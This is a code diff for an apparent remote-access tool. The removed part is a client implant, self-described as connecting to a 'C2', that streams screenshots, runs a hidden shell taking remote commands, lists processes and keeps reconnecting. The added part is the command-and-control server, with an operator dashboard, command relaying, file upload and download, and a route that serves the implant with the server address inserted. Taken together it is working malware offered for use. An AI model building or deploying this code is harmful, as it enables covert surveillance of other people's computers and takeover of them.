@@ -1,288 +1,284 @@
-import os
-import socket
-import socketio
-import subprocess
-import time
-import platform
-import mss
-import base64
-from PIL import Image
 import io
+import os
+import sqlite3
+from flask import Flask, render_template, request, jsonify, redirect, url_for, session, send_file
+from flask_socketio import SocketIO, emit, join_room, leave_room
+import logging
 import threading
-import sys
-import json
-import ctypes
+import time
+import yaml
+import re
 
-# --- Configuration ---
-C2_ADDRESS = "http://127.0.0.1:8004"
-RETRY_INTERVAL = 30
-TARGET_HEIGHT = 720
+with open('./config.yml', 'r') as file:
+    config = yaml.safe_load(file)
 
-# --- Intervals ---
-DEFAULT_SCREENSHOT_INTERVAL = 1.0
-SCREENSHOT_INTERVAL = DEFAULT_SCREENSHOT_INTERVAL
+print(config)
 
-# --- Persistence Configuration ---
-SCHEDULED_RECONNECT_SECONDS = 15 * 60
-HEARTBEAT_INTERVAL_SECONDS = 5
+# --- Basic Setup ---
+app = Flask(__name__)
+app.config['SECRET_KEY'] = os.urandom(24).hex()
+socketio = SocketIO(app, cors_allowed_origins="*", logger=False, engineio_logger=False, async_mode='threading')
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+logger = logging.getLogger(__name__)
 
-# --- Shell State ---
-shell_process = None
+DB_PATH = 'clients.db'
 
-def get_hostname_local():
-    return socket.gethostname()
+# --- In-Memory Cache ---
+screenshot_cache = {}
+last_seen_cache = {}
+connected_clients = {}
+uploaded_files = {}
 
-# --- Core Support ---
-event_logs = []
-def log_event(message):
-    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
-    log_entry = f"[{timestamp}] {message}"
-    event_logs.append(log_entry)
-    print(log_entry)
-    send_system_output(log_entry + "\n")
+# --- Database Setup ---
+def init_db():
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute('''CREATE TABLE IF NOT EXISTS clients
+                 (hostname TEXT PRIMARY KEY, alias TEXT, description TEXT)''')
+    c.execute('''CREATE TABLE IF NOT EXISTS macros
+                 (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, command TEXT)''')
+    conn.commit()
+    conn.close()
+init_db()
 
-sio = socketio.Client(logger=False, engineio_logger=False)
-connection_start_time = 0
+def get_client_metadata(hostname):
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute("SELECT alias, description FROM clients WHERE hostname=?", (hostname,))
+    row = c.fetchone()
+    conn.close()
+    return {'alias': row[0], 'description': row[1]} if row else {'alias': '', 'description': ''}
 
-def send_command_output(output):
-    if sio.connected:
-        sio.emit('command_output', {'output': output}, namespace="/api")
+def save_client_metadata(hostname, alias, description):
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute("INSERT OR REPLACE INTO clients (hostname, alias, description) VALUES (?, ?, ?)",
+              (hostname, alias, description))
+    conn.commit()
+    conn.close()
 
-def send_system_output(output):
-    if sio.connected:
-        sio.emit('system_output', {'output': output}, namespace="/api")
+def get_all_known_clients():
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute("SELECT hostname, alias, description FROM clients")
+    rows = c.fetchall()
+    conn.close()
+    return rows
 
-def send_screenshot(image_data):
-    if sio.connected:
-        sio.emit('screenshot', image_data, namespace="/api")
+def get_macros():
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute("SELECT id, name, command FROM macros")
+    rows = c.fetchall()
+    conn.close()
+    return [{'id': r[0], 'name': r[1], 'command': r[2]} for r in rows]
 
-def take_screenshots():
-    global SCREENSHOT_INTERVAL
-    with mss.mss() as sct:
-        while True:
-            if not sio.connected:
-                time.sleep(1)
-                continue
-            try:
-                sct_img = sct.grab(sct.monitors[1])
-                img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
-                new_h = TARGET_HEIGHT
-                new_w = int(new_h * (img.width / img.height))
-                resized_img = img.resize((new_w, new_h), Image.LANCZOS)
-                buffered = io.BytesIO()
-                resized_img.save(buffered, format="JPEG", quality=75)
-                img_str = base64.b64encode(buffered.getvalue()).decode('utf-8')
-                send_screenshot(img_str)
-                time.sleep(max(0.01, SCREENSHOT_INTERVAL))
-            except Exception as e:
-                log_event(f"ERROR: Screenshot failed: {e}")
-                time.sleep(SCREENSHOT_INTERVAL)
+def add_macro(name, command):
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute("INSERT INTO macros (name, command) VALUES (?, ?)", (name, command))
+    conn.commit()
+    conn.close()
 
-def start_heartbeat():
+def delete_macro(macro_id):
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute("DELETE FROM macros WHERE id=?", (macro_id,))
+    conn.commit()
+    conn.close()
+
+# --- Global State & Constants ---
+ADMIN_USERNAME = config["username"]
+ADMIN_PASSWORD = config["password"]
+DASHBOARD_ROOM = 'dashboards'
+DEFAULT_SCREENSHOT_DATA = "R0lGODlhAQABAIAAAAUEBAAAACwAAAAAAQABAAACAkQBADs="
+
+def get_merged_client_list():
+    known = get_all_known_clients()
+    live_hostnames = {c['hostname']: sid for sid, c in connected_clients.items()}
+    merged = []
+    for hostname, alias, description in known:
+        is_online = hostname in live_hostnames
+        display_img = screenshot_cache.get(hostname, DEFAULT_SCREENSHOT_DATA)
+        merged.append({
+            'hostname': hostname,
+            'alias': alias or hostname,
+            'description': description or "No description set.",
+            'id': live_hostnames.get(hostname),
+            'online': is_online,
+            'screenshot_data': display_img
+        })
+    return merged
+
+# --- Background Threads ---
+def periodic_monitor(socketio_instance):
+    STALE_TIMEOUT = 30
     while True:
-        time.sleep(HEARTBEAT_INTERVAL_SECONDS)
-        if sio.connected:
-            try: sio.emit('client_ping', namespace="/api")
-            except: pass
-
-def start_shell():
-    global shell_process
-    if shell_process and shell_process.poll() is None:
-        return
-    
-    log_event("DEBUG: Spawning unbuffered binary shell...")
-    executable = "cmd.exe" if platform.system() == "Windows" else "/bin/sh"
-    try:
-        shell_process = subprocess.Popen(
-            executable,
-            stdin=subprocess.PIPE,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.STDOUT,
-            shell=False,
-            bufsize=0,
-            text=False,
-            creationflags=subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0
-        )
-        
-        def stream_output():
-            log_event(f"DEBUG: Binary streamer started (Shell PID: {shell_process.id if hasattr(shell_process, 'id') else shell_process.pid}).")
-            last_emit = time.time()
-            buffer = b""
-            while True:
-                if not shell_process or shell_process.poll() is not None:
-                    break
-                try:
-                    if platform.system() == "Windows":
-                        import msvcrt
-                        from ctypes import wintypes
-                        handle = msvcrt.get_osfhandle(shell_process.stdout.fileno())
-                        avail = wintypes.DWORD()
-                        if not ctypes.windll.kernel32.PeekNamedPipe(handle, None, 0, None, ctypes.byref(avail), None):
-                            break
-                        if avail.value > 0:
-                            data = shell_process.stdout.read(avail.value)
-                            if data: buffer += data
-                    else:
-                        data = shell_process.stdout.read(1)
-                        if not data: break
-                        buffer += data
-                    
-                    now = time.time()
-                    if buffer and (len(buffer) > 2048 or (now - last_emit > 0.03) or b"\n" in buffer):
-                        send_command_output(buffer.decode(errors='ignore'))
-                        buffer = b""
-                        last_emit = now
-                    
-                    if not buffer:
-                        time.sleep(0.01)
-                except:
-                    break
-            if buffer:
-                send_command_output(buffer.decode(errors='ignore'))
-            log_event("DEBUG: Streamer thread exiting.")
-
-        threading.Thread(target=stream_output, daemon=True).start()
-    except Exception as e:
-        log_event(f"CRITICAL: Failed to start shell: {e}")
-
-@sio.on('connect', namespace="/api")
-def on_connect():
-    global connection_start_time
-    connection_start_time = time.time()
-    log_event("DEBUG: Connected to C2.")
-    sio.emit('client_info', {'hostname': get_hostname_local()}, namespace="/api")
-    start_shell()
-
-@sio.on('disconnect', namespace="/api")
-def on_disconnect():
-    global connection_start_time
-    connection_start_time = 0
-    log_event("WARNING: Disconnected from C2.")
-
-def handle_ps():
-    try:
-        # Tasklist format: CSV, No Header
-        res = subprocess.run(["tasklist", "/FO", "CSV", "/NH"], capture_output=True, text=True)
-        if res.returncode == 0:
-            lines = res.stdout.strip().split('\n')
-            processes = []
-            for line in lines:
-                # CSV format: "Image Name","PID","Session Name","Session#","Mem Usage"
-                parts = line.split('","')
-                if len(parts) >= 5:
-                    processes.append({
-                        "name": parts[0].replace('"', ''),
-                        "pid": parts[1].replace('"', ''),
-                        "mem": parts[4].replace('"', '')
-                    })
-            sio.emit('process_list', {'processes': processes}, namespace="/api")
-        else:
-            log_event(f"ERROR: tasklist failed: {res.stderr}")
-    except Exception as e:
-        log_event(f"ERROR: PS failed: {e}")
-
-def handle_internal_command(command_str):
-    global SCREENSHOT_INTERVAL, shell_process
-    parts = command_str.split()
-    if not parts: return
-    cmd = parts[0].lower()
-    
-    if cmd == "#scrsht":
-        if len(parts) > 1:
+        time.sleep(5)
+        with app.app_context():
+            now = time.time()
+            stale_ids = [sid for sid, data in connected_clients.items()
+                         if (now - data.get('last_seen', 0)) > STALE_TIMEOUT]
+            for sid in stale_ids:
+                hostname = connected_clients.get(sid, {}).get('hostname', 'Unknown')
+                logger.info(f"Disconnecting stale client: {hostname} ({sid})")
+                connected_clients.pop(sid, None)
+                try: socketio_instance.disconnect(sid, namespace='/api')
+                except: pass
             try:
-                ms = float(parts[1])
-                SCREENSHOT_INTERVAL = ms / 1000.0
-                log_event(f"SYSTEM: Interval set to {ms}ms")
-            except:
-                log_event("ERROR: Invalid interval")
-    elif cmd == "#logs":
-        log_event("SYSTEM: Logs are active.")
-    elif cmd == "#ps":
-        handle_ps()
-    elif cmd == "#reset":
-        log_event("SYSTEM: Force resetting shell process...")
-        if shell_process:
-            try:
-                shell_process.terminate()
-                time.sleep(0.3)
-                if shell_process.poll() is None: shell_process.kill()
-            except: pass
-        start_shell()
-    elif cmd == "#sigint":
-        if shell_process and shell_process.poll() is None:
-            pid = shell_process.pid
-            log_event(f"SYSTEM: Interrupting process tree for shell PID {pid}...")
-            try:
-                # Send raw Ctrl+C to stdin first
-                shell_process.stdin.write(b'\x03')
-                shell_process.stdin.flush()
-                
-                # Externally kill children
-                if platform.system() == "Windows":
-                    # Use powershell to find and kill all children of the shell
-                    kill_cmd = f"powershell -Command \"Get-CimInstance Win32_Process | Where-Object {{ $_.ParentProcessId -eq {pid} }} | ForEach-Object {{ Stop-Process -Id $_.ProcessId -Force }}\""
-                    subprocess.run(kill_cmd, shell=True, capture_output=True)
-                else:
-                    subprocess.run(f"pkill -P {pid}", shell=True, capture_output=True)
-                
-                log_event("SUCCESS: Interrupt signal dispatched.")
+                socketio_instance.emit('client_list', get_merged_client_list(), namespace='/api', to=DASHBOARD_ROOM)
             except Exception as e:
-                log_event(f"ERROR: Interrupt failed: {e}")
+                logger.error(f"Periodic update error: {e}")
 
-@sio.on('system_command', namespace="/api")
-def handle_system_command(command_str):
-    handle_internal_command(command_str.strip())
+# --- Routes ---
+@app.route('/')
+def index():
+    return redirect(url_for('login'))
 
-@sio.on('execute_command', namespace="/api")
-def handle_command(command_str):
-    global shell_process
-    line_end = "\r\n" if platform.system() == "Windows" else "\n"
-    if not shell_process or shell_process.poll() is not None:
-        start_shell()
-    if shell_process and shell_process.stdin:
-        try:
-            shell_process.stdin.write((command_str + line_end).encode())
-            shell_process.stdin.flush()
-        except Exception as e:
-            log_event(f"ERROR: Shell write error: {e}")
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    if request.method == 'POST':
+        data = request.json
+        if data.get('username') == ADMIN_USERNAME and data.get('password') == ADMIN_PASSWORD:
+            session['logged_in'] = True
+            return jsonify(message="Success"), 200
+        return jsonify(message='Invalid'), 401
+    return render_template('login.html')
 
-@sio.on('stdin', namespace="/api")
+@app.route('/logout')
+def logout():
+    session.pop('logged_in', None)
+    return redirect(url_for('login'))
+
+@app.route('/dashboard')
+def dashboard():
+    if 'logged_in' in session:
+        return render_template('dashboard.html')
+    return redirect(url_for("login"))
+
+@app.route('/payload')
+def payload():
+    with open("client.py", "r") as f:
+        content = f.read()
+
+    content = re.sub(r'(C2_ADDRESS\s*=\s*).*', f'C2_ADDRESS = "{config["url"]}"', content)
+    content = re.sub(r'(TARGET_HEIGHT\s*=\s*).*', f'TARGET_HEIGHT = {config["resolution"]}', content)
+
+    return send_file(io.BytesIO(content.encode()), mimetype='text/x-python', as_attachment=True, download_name='client.py')
+
+@app.route('/api/upload/<nonce>', methods=['POST'])
+def upload_file(nonce):
+    if 'file' not in request.files:
+        return "No file part", 400
+    file = request.files['file']
+    if file.filename == '':
+        return "No selected file", 400
+    
+    uploaded_files[nonce] = {
+        'content': file.read(),
+        'filename': file.filename
+    }
+    return "Upload successful", 200
+
+@app.route('/api/download/<nonce>', methods=['GET'])
+def download_uploaded_file(nonce):
+    if nonce not in uploaded_files:
+        return "File not found", 404
+    
+    file_data = uploaded_files[nonce]
+    # Optionally remove after download to save memory
+    # data = uploaded_files.pop(nonce)
+    return send_file(
+        io.BytesIO(file_data['content']),
+        as_attachment=True,
+        download_name=file_data['filename']
+    )
+
+# --- Socket Events ---
+@socketio.on('join_dashboard', namespace="/api")
+def handle_join_dashboard():
+    join_room(DASHBOARD_ROOM, sid=request.sid)
+    emit('client_list', get_merged_client_list())
+    emit('macro_list', get_macros())
+
+@socketio.on('client_info', namespace="/api")
+def handle_client_info(data):
+    hostname = data.get('hostname', 'Unknown')
+    logger.info(f"Client identified: {hostname} ({request.sid})")
+    meta = get_client_metadata(hostname)
+    if not meta['alias'] and not meta['description']:
+        save_client_metadata(hostname, hostname, "")
+    connected_clients[request.sid] = {'hostname': hostname, 'last_seen': time.time()}
+    socketio.emit('client_list', get_merged_client_list(), namespace='/api', to=DASHBOARD_ROOM)
+
+@socketio.on('disconnect', namespace="/api")
+def handle_disconnect():
+    if request.sid in connected_clients:
+        hostname = connected_clients[request.sid]['hostname']
+        logger.info(f"Client disconnected: {hostname} ({request.sid})")
+        connected_clients.pop(request.sid, None)
+    else:
+        logger.info(f"Unknown session disconnected: {request.sid}")
+
+@socketio.on('client_ping', namespace="/api")
+def handle_client_ping():
+    if request.sid in connected_clients:
+        connected_clients[request.sid]['last_seen'] = time.time()
+
+@socketio.on('update_metadata', namespace="/api")
+def handle_update_metadata(data):
+    if session.get('logged_in'):
+        save_client_metadata(data['hostname'], data['alias'], data['description'])
+        socketio.emit('client_list', get_merged_client_list(), namespace='/api', to=DASHBOARD_ROOM)
+
+@socketio.on('add_macro', namespace="/api")
+def handle_add_macro(data):
+    if session.get('logged_in'):
+        add_macro(data['name'], data['command'])
+        socketio.emit('macro_list', get_macros(), namespace='/api', to=DASHBOARD_ROOM)
+
+@socketio.on('delete_macro', namespace="/api")
+def handle_delete_macro(data):
+    if session.get('logged_in'):
+        delete_macro(data['id'])
+        socketio.emit('macro_list', get_macros(), namespace='/api', to=DASHBOARD_ROOM)
+
+@socketio.on('command', namespace="/api")
+def handle_command(data):
+    if session.get('logged_in'):
+        socketio.emit('execute_command', data.get('command'), to=data.get('client_id'), namespace='/api')
+
+@socketio.on('system_command', namespace="/api")
+def handle_system_command(data):
+    if session.get('logged_in'):
+        socketio.emit('system_command', data.get('command'), to=data.get('client_id'), namespace='/api')
+
+@socketio.on('stdin', namespace="/api")
 def handle_stdin(data):
-    global shell_process
-    cmd = data if isinstance(data, str) else data.get('command', '')
-    if shell_process and shell_process.poll() is None and shell_process.stdin:
-        try:
-            shell_process.stdin.write(cmd.encode())
-            shell_process.stdin.flush()
-        except Exception as e:
-            log_event(f"ERROR: Stdin write error: {e}")
+    if session.get('logged_in'):
+        socketio.emit('stdin', data.get('command'), to=data.get('client_id'), namespace='/api')
 
-def attempt_connection():
-    while True:
-        try:
-            if not sio.connected:
-                sio.connect(C2_ADDRESS, namespaces=['/api'])
-            return
-        except:
-            time.sleep(RETRY_INTERVAL)
+@socketio.on('command_output', namespace="/api")
+def handle_command_output(data):
+    socketio.emit('command_output', {'output': data.get('output'), 'client_id': request.sid}, namespace='/api', to=DASHBOARD_ROOM)
+
+@socketio.on('system_output', namespace="/api")
+def handle_system_output(data):
+    socketio.emit('system_output', {'output': data.get('output'), 'client_id': request.sid}, namespace='/api', to=DASHBOARD_ROOM)
+
+@socketio.on('process_list', namespace="/api")
+def handle_process_list(data):
+    socketio.emit('process_list', {'processes': data.get('processes'), 'client_id': request.sid}, namespace='/api', to=DASHBOARD_ROOM)
+
+@socketio.on('screenshot', namespace="/api")
+def handle_screenshot(image_data=None):
+    if request.sid in connected_clients and image_data:
+        if image_data == DEFAULT_SCREENSHOT_DATA: return
+        hostname = connected_clients[request.sid]['hostname']
+        screenshot_cache[hostname] = image_data
+        connected_clients[request.sid]['last_seen'] = time.time()
+        socketio.emit('screenshot_data', {'image_data': image_data, 'client_id': request.sid}, namespace="/api", to=DASHBOARD_ROOM)
 
 if __name__ == '__main__':
-    log_event("--- ERRATIC CLIENT ACTIVE ---")
-    threading.Thread(target=take_screenshots, daemon=True).start()
-    threading.Thread(target=start_heartbeat, daemon=True).start()
-    while True:
-        try:
-            if not sio.connected:
-                attempt_connection()
-            while sio.connected:
-                if time.time() - connection_start_time > SCHEDULED_RECONNECT_SECONDS:
-                    sio.disconnect()
-                    break
-                time.sleep(5)
-            time.sleep(5)
-        except KeyboardInterrupt:
-            break
-        except Exception as e:
-            log_event(f"CRITICAL: Main loop exception: {e}")
-            if sio and sio.connected: sio.disconnect()
-            time.sleep(RETRY_INTERVAL)
+    threading.Thread(target=periodic_monitor, args=(socketio,), daemon=True).start()
+    socketio.run(app, allow_unsafe_werkzeug=True, debug=False, host='0.0.0.0', port = config["port"], use_reloader=False)
